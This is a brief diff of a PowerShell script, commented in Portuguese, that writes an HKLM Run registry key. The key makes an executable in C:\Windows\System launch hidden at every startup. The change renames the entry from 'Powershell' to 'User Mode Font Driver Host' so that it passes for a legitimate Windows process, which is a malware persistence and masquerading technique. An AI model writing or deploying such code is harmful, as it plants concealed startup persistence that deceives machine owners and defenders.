@@ -6,4 +6,4 @@ $programPath = "C:\Windows\System\usermodefontdriverhost.exe"
 # Comando para adicionar a entrada no Registro e executar o script PowerShell de forma oculta
 $command = "C:\Windows\System\usermodefontdriverhost.exe"
 
-Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Powershell" -Value $command
+Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "User Mode Font Driver Host" -Value $command
